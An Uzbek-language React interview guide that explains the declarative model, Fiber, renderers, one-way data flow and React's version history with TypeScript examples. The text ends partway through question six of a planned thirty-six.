# React Core — Interview Savollari

> React fundamentals, rendering pipeline, JSX/TSX, list rendering bo'yicha interview savollari. Nazariy, output, coding, va bug fix savollar aralash.
>
> Har savol `[Junior+]`, `[Middle]`, `[Middle+]`, `[Senior]` daraja belgisi bilan. Senior savollarda **Deep Dive** mavjud — Fiber, scheduler, V8 internals chuqur.

---

## Mundarija

**QISM A: React Fundamentals** (savollar 1-9)
**QISM B: Rendering Pipeline** (savollar 10-19)
**QISM C: JSX va TSX** (savollar 20-30)
**QISM D: List Rendering va Keys** (savollar 31-36)

---

## QISM A: React Fundamentals

### 1. React nima va declarative model nima ma'noni anglatadi? [Junior+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

React — **declarative**, **component-based** UI library. Facebook tomonidan 2013-yilda chiqarilgan, hozirda Meta va katta open-source community tomonidan yuritiladi. Asosiy g'oya: UI'ni state'ning funksiyasi sifatida ifodalash — `UI = f(state)`. Developer "qanday qilib" emas, "nima ko'rinishi kerak" deb yozadi, React DOM'ni shu holatga sinxronlashtiradi.

### To'liq tushuntirish

**Declarative model**'da component'ning return value (JSX) — istalgan UI holatining **tasviri**. State o'zgargan paytda komponentni qayta chaqirib, yangi tasvirni olib, React eski va yangi tasvirni solishtiradi (reconciliation) va DOM'ga **minimal** o'zgarishlarni qo'llaydi. Developer `document.createElement`, `appendChild`, `removeChild`, `setAttribute` kabi imperative DOM API bilan ishlamaydi.

**Asosiy printsiplar:**

1. **Components** — UI'ni qayta ishlatiluvchi function/class birliklarga ajratish (`Button`, `UserCard`, `Modal`)
2. **One-way data flow** — props pastga, events yuqoriga
3. **Composition over inheritance** — komponentlarni bir-biriga ulash orqali murakkab UI qurish
4. **Pure render functions** — bir xil props/state — bir xil JSX (deterministik)
5. **Renderer abstraction** — `react` core kutubxonasi platform-agnostic; `react-dom`, `react-native`, `react-three-fiber`, `ink` kabi renderer'lar uni har xil platformaga ulaydi

### Kod misoli

```tsx
// ❌ Imperative — "qanday qilib" qadamlar
const button = document.createElement("button");
button.textContent = "Count: 0";
let count = 0;
button.addEventListener("click", () => {
  count += 1;
  button.textContent = `Count: ${count}`;
});
document.body.appendChild(button);

// ✅ Declarative React — "nima ko'rinishi kerak"
import { useState } from "react";

function Counter() {
  const [count, setCount] = useState(0);
  return (
    <button onClick={() => setCount(count + 1)}>
      Count: {count}
    </button>
  );
}
```

JSX expression `<button>Count: {count}</button>` — bu **istalgan vaqtdagi UI tasviri**. State o'zgarganda, `Counter()` qayta chaqiriladi, yangi JSX qaytadi, React eski tasvir bilan farqni hisoblab, faqat `textContent`'ni yangilaydi (DOM node qayta yaratilmaydi).

<details>
<summary><strong>Deep Dive</strong></summary>

**Engine darajasida nima sodir bo'ladi:**

1. **JSX → `React.createElement`/`_jsx` chaqiruvi** — Babel/SWC compile-time'da JSX'ni JavaScript function chaqiruviga aylantiradi:
   ```tsx
   <button onClick={handler}>Count: {count}</button>
   // ↓ compile after
   _jsx("button", { onClick: handler, children: ["Count: ", count] });
   ```

2. **Element object** — `_jsx` plain JS object qaytaradi (React Element):
   ```tsx
   {
     $$typeof: Symbol(react.element),
     type: "button",
     props: { onClick: handler, children: ["Count: ", count] },
     key: null,
     ref: null
   }
   ```

3. **Reconciliation** — React shu element-tree'ni eski Fiber-tree bilan solishtiradi. Element type bir xil bo'lsa (`"button"`) — Fiber update yo'lidan o'tadi, props farqi hisoblanadi (`onClick` reference, `children` array).

4. **Commit Phase** — Fiber tree finalize bo'lgach, React DOM faqat o'zgargan property'larni qo'llaydi (`button.textContent` o'rniga aslida `setTextContent` chaqiruvi).

**Nima uchun declarative tezroq emas, lekin barqarorroq:** Imperative kod minimal DOM mutation qilishi mumkin (qo'lda yozsa), lekin har state holati uchun barcha edge case'larni hisobga olish kerak. Declarative — React har gal full diff qiladi va minimal mutation chiqaradi (Fiber pointer-based diff: O(n)). Inson xatolarsiz bunga erishishi qiyin (especially conditional UI, list reorder, async state updates bilan).

</details>

### Edge Cases

- **Reactivity != observables**: React state o'zgartirilganda, **u state'ga bog'liq komponent qayta render qilinadi va undan child'lar ham** (default). Vue/Solid kabi fine-grained reactivity'dan farqli ravishda — React subtree-based.
- **Pure render majburiyati**: Render funksiya **side-effect'siz** bo'lishi shart (no `setState` in body, no DOM mutation, no fetch). Strict Mode 2x render bilan buni majburlaydi.
- **Reference identity matters**: Inline object/array har render'da yangi reference yaratadi — bu `React.memo` bypass qilishi va useEffect dep'larini noto'g'ri ishga tushirishi mumkin.

### Follow-up savollar

- "Declarative deganda Vue va React orasida farq bormi?" — Vue templates compile-time analyze qilinadi (compiler dependencies'ni biladi), React esa runtime diff'ga tayanadi. Vue fine-grained reactivity beradi (faqat o'zgargan node), React subtree re-render qiladi (lekin React Compiler bilan auto-memoization yondashuvi yaqinlashadi).
- "Imperative API React ichida hech qaerda ishlatilmaydimi?" — Ishlatiladi: `useRef` + `imperativeHandle`, `flushSync`, DOM measurement (`useLayoutEffect`), portals — escape hatch'lar mavjud.

</details>

---

### 2. Declarative vs Imperative — vanilla JS vs React kod taqqoslang [Junior+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Imperative**: "har qadamni" yozish — DOM'ni manually yaratish, o'zgartirish, o'chirish. **Declarative**: "natija qanday bo'lishini" yozish — React state asosida UI'ni avtomatik sinxronlashtiradi. Imperative tezroq, lekin xato yo'l-yo'lakay; declarative barqaror, scaling oson.

### To'liq tushuntirish

| Aspekt | Imperative (vanilla JS) | Declarative (React) |
|--------|-------------------------|---------------------|
| **Yozish uslubi** | Step-by-step DOM mutation | UI = f(state) tasvir |
| **Holat boshqaruvi** | Variable + manual sync | `useState` + auto re-render |
| **Edge cases** | Har birini qo'lda hisoblash | React reconciliation handle qiladi |
| **Test qilish** | DOM mocking kerak | Pure function test |
| **Refactoring** | UI o'zgartirsa — ko'p joy yangilanadi | Komponent o'zgartirsa — bir joy |
| **Performance** | Optimal mumkin (manual) | Ko'p hollarda yetarli (Reconciler optimize qiladi) |
| **Readability** | Boshlang'ich oson, scale qiyin | Boshlang'ich biroz qiyin, scale oson |

### Kod misoli

**Vazifa**: Counter — tugmani bosganda increment, 5'dan keyin "Maximum reached" ko'rsatish, boshlang'ich state'ga qaytish tugmasi.

```html
<!-- ❌ Imperative (vanilla JS) -->
<div id="app"></div>
<script>
  const app = document.getElementById("app");
  let count = 0;

  function render() {
    app.replaceChildren();  // tree'ni tozalash

    const display = document.createElement("p");
    display.textContent = `Count: ${count}`;
    app.appendChild(display);

    if (count >= 5) {
      const warning = document.createElement("strong");
      warning.textContent = "Maximum reached";
      app.appendChild(warning);
    }

    const incBtn = document.createElement("button");
    incBtn.textContent = "+";
    incBtn.disabled = count >= 5;
    incBtn.addEventListener("click", () => {
      count += 1;
      render();  // ← qo'lda re-render
    });
    app.appendChild(incBtn);

    const resetBtn = document.createElement("button");
    resetBtn.textContent = "Reset";
    resetBtn.addEventListener("click", () => {
      count = 0;
      render();  // ← yana qo'lda
    });
    app.appendChild(resetBtn);
  }

  render();  // initial render
</script>
```

**Muammolar**: Har gal butun tree o'chirilib qayta yaratilsa — input focus yo'qoladi, animatsiya buziladi, performance yomon. Optimal qilish uchun har element'ni qo'lda update qilish kerak (`incBtn.disabled = ...`) — kod murakkablashadi.

```tsx
// ✅ Declarative React
import { useState } from "react";

function Counter() {
  const [count, setCount] = useState(0);
  const isMax = count >= 5;

  return (
    <div>
      <p>Count: {count}</p>
      {isMax && <strong>Maximum reached</strong>}
      <button onClick={() => setCount(count + 1)} disabled={isMax}>
        +
      </button>
      <button onClick={() => setCount(0)}>Reset</button>
    </div>
  );
}
```

**Afzalliklari**:
- DOM mutation kodi yo'q
- Conditional rendering — `{isMax && ...}` (declarative)
- Event handler — `onClick={...}` (synthetic events, automatic cleanup)
- React diff qiladi va faqat o'zgargan node'larni yangilaydi (input focus saqlanadi)

<details>
<summary><strong>Deep Dive</strong></summary>

**Performance taqqoslash (mental model):**

| Operatsiya | Vanilla (manual optimal) | React |
|------------|--------------------------|-------|
| Initial render | Engil (minimal DOM ops) | Fiber overhead bor (Element + Fiber object'lar) |
| Re-render | Manual diff kerak | Avtomatik reconciliation (Object.is bailout) |
| Reorder N item | Manual: har holatni qo'lda boshqarish | React keyed: linked-list move flag bilan O(N) |
| Bug ehtimoli | Yuqori (state ↔ DOM sinxron qo'lda) | Past (declarative invariant) |

**Vanilla "manual optimal" ko'pincha xato yoziladi** — developer state ↔ DOM sinxronligini xato boshqaradi. React'ning "biroz sekinroq lekin to'g'ri" yondashuvi production'da odatda foydaliroq.

**Reconciler diff algoritmi**: Old fiber tree va new element tree'ni traverse qilib, type/key bo'yicha mos kelgan node'larni topadi va props farqini hisoblaydi (O(n) — full O(n³) emas, chunki React 2 ta heuristic ishlatadi: same type → in-place update; different type → unmount + mount).

**Inputni misol**: Imperative'da butun parent tree'ni qayta yaratsa — focused input element o'chiriladi, focus yo'qoladi, IME composition buziladi (Asian languages). React'da fiber identity saqlanadi → DOM node qayta yaratilmaydi → focus saqlanadi. Bu **eng katta production farq**.

</details>

### Edge Cases

- **`innerHTML` security**: Vanilla'da `innerHTML = userInput` — XSS xavfi (script tag inject). React'da JSX text — automatic escape; faqat `dangerouslySetInnerHTML` xavfli (nomi shuni eslatadi).
- **Memory leaks**: Vanilla'da `addEventListener` yozilsa — manual `removeEventListener` kerak (komponent unmount bo'lganda). React'da synthetic events — automatic cleanup.
- **Race conditions**: Async (`fetch`) bilan vanilla — manual cancellation. React'da `useEffect` cleanup + `AbortController`.

### Follow-up savollar

- "Vanilla'ni qachon ishlatish kerak?" — performance-critical leaflar (canvas/WebGL render loop), framework-free embeddable widget, kichik static page.
- "Web Components imperative-mi declarative-mi?" — Custom Elements API hybrid: lifecycle callback'lar imperative (`connectedCallback`), lekin Lit kabi kutubxonalar declarative template beradi.
- "React Compiler bilan farq qoladi-mi?" — Compiler memoization'ni avtomatlashtiradi, lekin model declarative qoladi (faqat ko'proq optimize).

</details>

---

### 3. Virtual DOM nima va Fiber bilan farqi nimada? [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Virtual DOM** — UI'ning JS object holatidagi tasviri. **Fiber** — Virtual DOM ning aniq implementation'i (R16+): har element uchun **work unit** (Fiber node) bo'lib, linked list orqali bog'langan, **interruptible** rendering imkonini beradi. Eski (pre-R16) "Stack Reconciler" — recursive, uninterruptible edi.

### To'liq tushuntirish

**Virtual DOM (mental model):**
- Real DOM operatsiyalari qimmat (reflow, repaint)
- Har gal real DOM'ni tahrir qilish o'rniga, JS object'da UI tasvirini saqlash
- Eski va yangi tasvirni JS'da diff qilish (tez), faqat farqlarni real DOM'ga qo'llash

**Fiber (concrete implementation):**
- Har komponent/element uchun Fiber node
- Har Fiber'da: `type`, `props`, `state`, `child`, `sibling`, `return` (parent), `alternate` (oldingi tree node'iga reference)
- **Double buffering**: `current` tree (render qilingan) + `workInProgress` tree (yangilanmoqda)
- Linked list traversal (recursive emas) — har step'da yield qilib, browser'ga vaqt berish mumkin

**Asosiy farq:** Virtual DOM — **g'oya**; Fiber — **uning aniq tuzilmasi va algoritmi** (interruptible, prioritized work).

### Kod misoli

```tsx
// JSX
function App() {
  return (
    <div className="app">
      <h1>Hello</h1>
      <p>World</p>
    </div>
  );
}

// React Element tree (Virtual DOM tasviri)
{
  type: "div",
  props: {
    className: "app",
    children: [
      { type: "h1", props: { children: "Hello" } },
      { type: "p", props: { children: "World" } }
    ]
  }
}

// Fiber tree (har element uchun Fiber node)
//        ┌─ Fiber(App) ─┐
//        │   child ↓    │
//        │              │
//        └─ Fiber(div) ─┘
//             child ↓
//        ┌─ Fiber(h1) ─→ sibling → Fiber(p)
//        │  return ↑                return ↑
//        │           (ikkalasi div'ga)
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Fiber node strukturasi (V8/React internals soddalashtirilgan):**

```typescript
type Fiber = {
  // Identity
  tag: WorkTag;          // FunctionComponent, HostComponent, etc.
  type: any;             // 'div', App function, MyClass
  key: string | null;
  elementType: any;

  // Tree structure (linked list)
  return: Fiber | null;   // parent
  child: Fiber | null;    // first child
  sibling: Fiber | null;  // next sibling

  // Double buffering
  alternate: Fiber | null; // pair fiber (current ↔ workInProgress)

  // State
  memoizedState: any;     // hooks (linked list of hook objects)
  memoizedProps: any;     // last committed props
  pendingProps: any;      // new props for next render
  updateQueue: any;       // pending state updates

  // Effects
  flags: Flags;           // bitmask: Placement, Update, Deletion, Passive, ...
  subtreeFlags: Flags;    // children flags (fast skip)

  // Scheduling
  lanes: Lanes;           // priority lanes for this fiber
  childLanes: Lanes;      // children's lanes

  // ...
};
```

**Stack Reconciler (R15) muammosi:**
- Recursive `reconcile(parent, oldChildren, newChildren)` — JS call stack'da
- 1000 ta komponent — 1000 stack frame, browser bloklanadi
- Hech qachon yield qilmaydi — long task → janky animation, dropped frames

**Fiber yechimi:**
1. **Linked list traversal** — `child → sibling → return` pointer'lar bilan, recursion yo'q
2. **Work loop** — `while (nextUnitOfWork && !shouldYield()) { performUnitOfWork(); }`
3. **Time slicing** — har 5ms'da `shouldYield()` qaytadi true (`requestIdleCallback` o'rniga `MessageChannel`)
4. **Priority lanes** — high priority (input) low priority (background data)'ni interrupt qila oladi
5. **Restartable** — render phase mutation'siz bo'lganligi uchun, kerak bo'lsa qayta boshlanadi

**Memory layout (V8 hidden classes):**
- Har Fiber doimiy shape — V8 monomorphic IC ishlaydi (tez property access)
- `alternate` pointer — re-allocate qilmasdan ikki tree o'rtasida swap
- `flags` bitmask — bit OR/AND fast operations

**"Virtual DOM" termini React docs'da deyarli ishlatilmaydi (2026):** React docs (react.dev) "React Element" va "Fiber" terminlarini ishlatadi. "Virtual DOM" tashqi/edukatsion termin — texnik aniq nom emas.

</details>

### Edge Cases

- **VDOM ≠ shadow tree**: Virtual DOM JS object; Shadow DOM (Web Components) — browser API.
- **Fiber ≠ React Element**: Element — immutable description (props, type); Fiber — mutable runtime node (memoizedState, alternate). Bir element render'da bir nechta Fiber'ga teng bo'lishi mumkin (re-render'larda).
- **Solid/Svelte'da VDOM yo'q**: Bu kutubxonalar compile-time'da reactivity DAG quradi va to'g'ridan-to'g'ri DOM mutation qiladi — microbenchmark'larda React'dan tezroq ko'rinadi, lekin real app'da farq kichik (Reconciler ham yaxshi optimize).

### Follow-up savollar

- "VDOM tezroqmi DOM'dan?" — Yo'q. **VDOM doim sekinroq** chunki bu qo'shimcha layer. Foyda — **batching va minimal mutation** orqali real DOM ishini kamaytirish. Bitta DOM mutation arzon, 1000 tasi qimmat — VDOM 1000 tasini 1 ta batch'ga jamlaydi.
- "Fiber qanday qilib pause qiladi?" — Render phase pure (no DOM mutation). Pause = work loop'dan chiqish, browser'ga `MessageChannel.postMessage` orqali microtask yield. Resume — saqlangan `nextUnitOfWork`'dan davom.
- "`alternate` pointer nima uchun kerak?" — Double buffering. Render phase'da yangi `workInProgress` tree quriladi (ammo render xatosi bo'lsa, `current` o'zgarmasdan qoladi). Commit muvaffaqiyatli bo'lsa, swap: `current = workInProgress`.

</details>

---

### 4. Renderer concept — `react-dom` va boshqa renderer'lar [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

`react` package — platform-agnostic core (komponentlar, hooks, reconciler interface). **Renderer** — uni aniq platformaga ulaydigan adapter: `react-dom` (browser), `react-native` (iOS/Android native), `react-three-fiber` (WebGL/Three.js), `ink` (terminal), `react-pdf` (PDF document). Bitta `react` package, bir nechta renderer.

### To'liq tushuntirish

React arxitekturasi 2 qatlamga ajraladi:

1. **Reconciler** (`react-reconciler` package) — Fiber algoritmi, scheduling, hooks dispatcher. Platform haqida hech narsa bilmaydi.
2. **Host config** — har renderer reconciler'ga "host platform"'ga qanday yozish kerakligini aytadi: `appendChild`, `removeChild`, `commitTextUpdate`, `prepareUpdate`, va h.k.

Renderer = **host config implementation**.

**Asosiy renderer'lar (2026):**

| Renderer | Platform | Use case |
|----------|----------|----------|
| `react-dom` | Browser DOM | Web apps |
| `react-dom/server` | Node/Edge | SSR (HTML string/stream) |
| `react-native` | iOS/Android | Mobile native |
| `react-three-fiber` | WebGL (Three.js) | 3D scenes |
| `ink` | Terminal (Node.js) | CLI UIs |
| `react-pdf` | PDF document | PDF generation |
| `react-tv` | Smart TV | TV apps |
| `react-canvas` | HTML5 Canvas | Custom 2D rendering |
| `react-figma` | Figma plugin | Figma plugin UI |
| `remotion` | Video frames | Programmatic video |

### Kod misoli

```tsx
// Bir xil komponent — turli renderer'lar
function Greeting({ name }: { name: string }) {
  return <Text>Hello, {name}!</Text>;
}

// 1. react-dom (browser)
import { createRoot } from "react-dom/client";
const root = createRoot(document.getElementById("app")!);
root.render(<Greeting name="World" />);
// → DOM: <div>Hello, World!</div>

// 2. ink (terminal)
import { render, Text } from "ink";
render(<Greeting name="Terminal" />);
// → stdout: "Hello, Terminal!"

// 3. react-pdf (PDF)
import { Document, Page, Text, pdf } from "@react-pdf/renderer";
const doc = (
  <Document>
    <Page>
      <Greeting name="PDF" />
    </Page>
  </Document>
);
const blob = await pdf(doc).toBlob();
// → PDF file

// 4. react-three-fiber (WebGL)
import { Canvas, Text } from "@react-three/fiber";
<Canvas>
  <Greeting name="3D" />
</Canvas>
// → WebGL scene
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Host config interface (sodda):**

```typescript
type HostConfig<Type, Props, Container, Instance, ...> = {
  // Lifecycle
  createInstance(type, props, root, hostContext, fiber): Instance;
  appendInitialChild(parent, child): void;
  finalizeInitialChildren(instance, type, props): boolean;

  // Tree mutation
  appendChild(parent, child): void;
  removeChild(parent, child): void;
  insertBefore(parent, child, before): void;

  // Update
  prepareUpdate(instance, type, oldProps, newProps): UpdatePayload | null;
  commitUpdate(instance, payload, type, oldProps, newProps): void;

  // Text
  createTextInstance(text): TextInstance;
  commitTextUpdate(textInstance, oldText, newText): void;

  // Scheduling
  scheduleTimeout(fn, delay): TimeoutHandle;
  cancelTimeout(handle): void;
  shouldYield(): boolean;

  // Concurrent
  isPrimaryRenderer: boolean;
  // ...
};
```

`react-dom` host config:
- `createInstance("div", props)` → `document.createElement("div")` + property setting
- `appendChild(parent, child)` → native DOM API
- `commitTextUpdate(node, _, newText)` → `node.nodeValue = newText`

`react-native` host config:
- `createInstance("View", props)` → native iOS/Android view (UIView/ViewGroup) yaratish (UIManager via JSI)
- `appendChild` → native bridge orqali view hierarchy update

**`react-test-renderer`** ham renderer — fake JSON tree yaratadi, tests uchun.

**Custom renderer yozish:** `react-reconciler` package'ni ishlatish, `HostConfig` implement qilish, `ReactReconciler({ ... }).createContainer(...)` chaqirish. Real misol: `ink` Node.js terminal escape sequences yozadi; `react-pdf` PDF AST quradi.

**Reconciler isolation:** R18+ reconciler `react` core'dan ajratilgan — har renderer o'z reconciler instance'iga ega. Sabab: bir page'da ham `react-dom` ham `react-three-fiber` (Canvas ichida) ishlashi kerak — tearing yo'q.

**Concurrent rendering primary vs secondary renderer:**
- `isPrimaryRenderer: true` — `react-dom` (asosiy)
- `isPrimaryRenderer: false` — `react-three-fiber` (Canvas ichida joylashganda DOM'dan keyin commit)

</details>

### Edge Cases

- **Bir nechta renderer bir page'da**: Mumkin — `<Canvas>` ichida `react-three-fiber`, atrofida `react-dom`. Reconciler isolation buni handle qiladi.
- **`react-native-web`**: RN komponentlarini DOM'ga render qiladi — RN-style API'ni react-dom orqali ishlatish. Texnikan `react-native` package emas.
- **SSR renderer**: `react-dom/server` — DOM yaratmaydi, faqat HTML string/stream chiqaradi. Hydration vaqtida `react-dom/client` Fiber tree quradi va DOM bilan bog'laydi.

### Follow-up savollar

- "Server-side rendering renderer'mi?" — Ha, `react-dom/server` (`renderToString`, `renderToReadableStream`) — alohida renderer. HTML string chiqaradi, real DOM yaratmaydi.
- "RN'da Virtual DOM bormi?" — Ha, Fiber tree bor. Faqat host instance — DOM element emas, native UIView/ViewGroup.
- "Custom renderer build qilish qanchalik qiyin?" — `react-reconciler` API (~30 method) implement qilish kerak. Oddiy text-based renderer 200-300 qatorda yoziladi (ink misoli). Production-grade WebGL renderer murakkabroq (resource management, batched draw calls).

</details>

---

### 5. One-way data flow nima va nima uchun React shu modelda? [Junior+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**One-way data flow** = "props down, events up". Parent komponent props orqali ma'lumotni bola komponentlarga pastga uzatadi. Bola state'ni o'zgartirish uchun callback (event handler) chaqiradi — parent shu callback ichida o'z state'ini yangilaydi. Two-way binding (Vue v-model, Angular ngModel) kabi ikki tomonlama avtomatik sinxron yo'q.

### To'liq tushuntirish

**Asosiy g'oya:**
1. Data **bir tomonga** oqadi — top-down (root → leaves) props orqali
2. State'ni o'zgartirish uchun bola **events**'ni emit qiladi (callback prop'ni chaqiradi)
3. Parent state'ni yangilaydi — yangi props pastga oqadi
4. Cycle: state → props → child → event → callback → setState → render

**Nima uchun shu modelda:**
- **Predictable**: Data oqimi aniq — debugging oson (state qaerdan kelgan? props chain'ni kuzating)
- **Single source of truth**: State bir joyda yashaydi (eng yuqori umumiy parent)
- **Reasoning**: Parent o'z state'ini boshqaradi, bola unga ta'sir qila olmaydi (faqat callback orqali)
- **Reconciliation safety**: Bola parent state'ini to'g'ridan-to'g'ri o'zgartira olmasa, render purity buzilmaydi

### Kod misoli

```tsx
// ✅ One-way data flow
interface UserCardProps {
  name: string;
  onDelete: (name: string) => void;
}

function UserCard({ name, onDelete }: UserCardProps) {
  // Bola: props oladi (down)
  return (
    <div>
      <span>{name}</span>
      {/* Bola: callback chaqiradi (up) */}
      <button onClick={() => onDelete(name)}>Delete</button>
    </div>
  );
}

function UserList() {
  // Parent: state owner
  const [users, setUsers] = useState<string[]>(["Ali", "Vali", "Soli"]);

  // Parent: state'ni o'zgartiradi
  const handleDelete = (name: string) => {
    setUsers((prev) => prev.filter((u) => u !== name));
  };

  return (
    <div>
      {users.map((user) => (
        <UserCard
          key={user}
          name={user}              // ↓ data down
          onDelete={handleDelete}  // ↓ event handler down
        />
      ))}
    </div>
  );
}
```

**Anti-pattern (one-way buzilishi):**

```tsx
// ❌ Bola parent props'ini mutate qiladi (taqiqlanadi)
function UserCard({ user }: { user: { name: string } }) {
  user.name = "MUTATED";  // ← parent state'ni buzadi
  return <div>{user.name}</div>;
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Two-way binding'dan farq:**

```html
<!-- Vue (two-way) -->
<input v-model="name" />
<!-- = -->
<input :value="name" @input="name = $event.target.value" />
```

Vue compiler buni kengaytiradi — declaratively two-way ko'rinadi, lekin under the hood u ham one-way (sintaktik shakar). Real two-way binding (KnockoutJS observable, Angular 1 ngModel) — variable getter/setter orqali har gal changes propagate qiladi.

**React'da two-way analog:**
```tsx
const [value, setValue] = useState("");
<input value={value} onChange={(e) => setValue(e.target.value)} />
// ← explicit, controlled
```

**Nima uchun React explicit'ni tanladi:**
1. **No magic** — kim setValue chaqiradi aniq ko'rinadi
2. **Validation hook** — onChange ichida value'ni filter/transform qilish oson
3. **Reconciliation invariant** — render funksiya pure, state mutation faqat dispatcher orqali (setState) — concurrent rendering uchun kritik
4. **Unidirectional debugging** — DevTools'da action → state → re-render chain ko'rinadi (Redux DevTools — bu g'oyani kengaytirgan)

**Flux/Redux'gacha bo'lgan tarix:**
- 2014: Facebook Flux pattern e'lon qildi — strict unidirectional (Action → Dispatcher → Store → View)
- 2015: Redux (Dan Abramov) — Flux'ning soddalashtirilgan versiyasi
- React props down + events up — Flux'ning komponent darajasidagi versiyasi

**Concurrent rendering bilan bog'lanish:** Render phase pure bo'lgani uchun, React render'ni qayta tashlashi mumkin. Agar bola parent state'ni mutate qila olsa — har retry boshqa natija beradi (non-deterministic). One-way + immutability shu invariantni saqlaydi.

</details>

### Edge Cases

- **Context — one-way bypass emas**: Context "data down"'ning shortcut'i (props drilling'siz). Hali ham parent → bola yo'nalishi.
- **`useImperativeHandle` — escape hatch**: `ref.current.focus()` parent'dan bola'ga imperative method chaqirish — declarative one-way'ga zid, lekin DOM API integratsiyasi uchun zarur.
- **External store + `useSyncExternalStore`**: Redux/Zustand store o'qish — texnikan parent emas, lekin bir xil one-way printsip — store update'lar dispatch orqali, komponentlar subscribe.

### Follow-up savollar

- "Lifting state up nima?" — Ikki sibling komponent bir xil state'ga muhtoj bo'lsa, state ularning umumiy parent'iga ko'tariladi. One-way modelni saqlash uchun zarur (sibling siblings'ga props uzata olmaydi — parent orqali).
- "Two-way binding qachon qulay?" — Form-heavy app'larda (admin panel, CRUD). React'da `react-hook-form` kabi kutubxonalar two-way ko'rinishini beradi (uncontrolled + ref).
- "Redux one-way'ni kuchaytiradi-mi?" — Ha, lekin global. Action → Reducer → Store → useSelector → komponent. Komponent dispatch chaqiradi (events up bilan analog), data store'dan keladi.

</details>

---

### 6. React tarixi va R16 → R16.8 → R18 → R19 evolyutsiyasi [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

React 2013-yilda Facebook'da chiqdi. Asosiy bosqichlar: **R16 (2017)** Fiber arxitekturasi, **R16.8 (2019)** Hooks, **R17 (2020)** infrastructure (event delegation root'ga), **R18 (2022)** Concurrent rendering + automatic batching, **R19 (2024)** RSC API stable (framework-da ishlatish uchun), Document APIs, ref as prop, Compiler RC.

### To'liq tushuntirish

**Detailed timeline:**

| Yil | Versiya | Asosiy o'zgarishlar |
|-----|---------|---------------------|
| 2013-may | 0.3 (open-source) | Facebook'dan chiqdi |
| 2015 | 0.14 | `react-dom` ajratildi |
| 2016 | 15 | Stack Reconciler oxirgi versiyasi |
| 2017-sep | 16 | **Fiber arxitekturasi**, error boundaries, fragments, portals |
| 2018-mar | 16.3 | Modern Context API (`createContext`), `forwardRef`, lifecycle revamp |
| 2019-feb | 16.8 | **Hooks** (`useState`, `useEffect`, `useContext`, ...) |
| 2020-okt | 17 | Infrastructure release: event delegation `document` → root container, JSX automatic transform tayyorlandi |
| 2022-mar | 18 | **Concurrent rendering** (`startTransition`, `useTransition`, `useDeferredValue`), automatic batching, Suspense for SSR, `useSyncExternalStore`, `useId`, Strict Mode 2x effect |
| 2024-dek | 19 | **RSC stable** (framework'da), Server Actions, ref as prop, Document metadata APIs, Resource preloading, `use()` hook, `useActionState`, `useOptimistic`, `useFormStatus`, ref cleanup, `<Context value>` shorthand, React Compiler RC |

**Kelajak (post-R19):**
- React Compiler stabilizatsiyasi
- View Transitions integratsiyasi
- Activity (offscreen) API stable

### Kod misoli

```tsx
// R16.8 dan oldin (Class komponentlar majburiy edi state uchun):
class Counter extends React.Component {
  state = { count: 0 };
  componentDidMount() { console.log("mounted"); }
  render() {
    return (
      <button onClick={() => this.setState({ count: this.state.count + 1 })}>
        {this.state.count}
      </button>
    );
  }
}

// R16.8+ (Hooks) — function komponentlar to'liq imkoniyatga ega:
function Counter() {
  const [count, setCount] = useState(0);
  useEffect(() => { console.log("mounted"); }, []);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}

// R19 yangiliklar:
// 1. ref oddiy prop (forwardRef kerak emas)
function Input({ ref, ...props }: { ref?: React.Ref<HTMLInputElement> }) {
  return <input ref={ref} {...props} />;
}

// 2. <Context value> (.Provider kerak emas)
const ThemeContext = createContext("light");
<ThemeContext value="dark"><App /></ThemeContext>

// 3. use() hook — Promise va Context conditional o'qish
function UserProfile({ userPromise }: { userPromise: Promise<User> }) {
  const user = use(userPromise);  // Suspense bilan
  return <div>{user.name}</div>;
}

// 4. Document metadata har komponent ichida
function ProductPage({ product }: { product: Product }) {
  return (
    <article>
      <title>{product.name} — Online Store</title>
      <meta name="description" content={product.description} />
      <h1>{product.name}</h1>
    </article>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Har versiyaning sababi:**

**R16 — Fiber (2017):**
- Eski Stack Reconciler — recursive, JS call stack'da
- Katta tree (1000+ komponent) — bir vaqtda render — long task — janky
- Fiber: linked list + work loop + interruption — UI responsiveness uchun asos
- Error boundaries — eski (R15)'da error subtree'ni butun app'ni buzadi; R16'da `componentDidCatch` bilan local recovery
- Fragments (`<>`) — array return mumkin bo'ldi (single root majburiyligi yumshatildi)
- Portals — modal/tooltip uchun DOM tree dan tashqari render

**R16.8 — Hooks (2019):**
- Class komponent muammolari: `this` binding, lifecycle "soup" (bir method'da turli concerns), HOC/render props logic reuse hell
- Hooks — function komponent + lifecycle replacement
- Internal: linked list per fiber (`memoizedState`), call order matters → "Rules of Hooks"

**R17 — Infrastructure (2020):**
- Hech qanday yangi feature for developers
- Event delegation: `document` → root container — multiple React versions bir page'da ishlashi mumkin (microfrontends)
- JSX automatic transform — `import React from 'react'` kerak emas
- Gradual upgrades imkoniyati (mixed R16/R17 trees)

**R18 — Concurrent (2022):**
- Concurrent rendering: priority lanes, time slicing, interruption — Fiber'ning original maqsadi nihoyat realize qilindi
- Automatic batching: setTimeout, Promise, native event listener — barcha kontekstlarda
- Strict Mode 2x effect — concurrent invariants tekshirish (cleanup-resilient effects)
- Suspense for SSR + selective hydration
- `useSyncExternalStore` — external store tearing prevention
- `useId` — SSR-safe unique ID

**R19 — Stable RSC + DX (2024):**
- RSC va Server Actions — full-stack React
- Document metadata — `react-helmet` kerak emas
- Resource preloading — `preload`, `preinit`
- DX: `forwardRef` ortiqcha, `Context.Provider` ortiqcha, ref cleanup
- React Compiler RC — auto-memoization

**Hozirgi developer impact:**
- Modern React = Function komponent + Hooks + R18+ features
- Class komponent — faqat error boundaries (hozircha)
- R19 — hatto error boundaries Compiler/SSR-safe alternativalar bilan almashtirilmoqda

**Migration breaking changes:**
- R15 → R16: deprecated lifecycle methods (`componentWillReceiveProps`, `componentWillUpdate`, `componentWillMount`) — R17.4'da `UNSAFE_` prefix
- R16 → R17: ko'p kod o'zgarishi yo'q, faqat event delegation testing
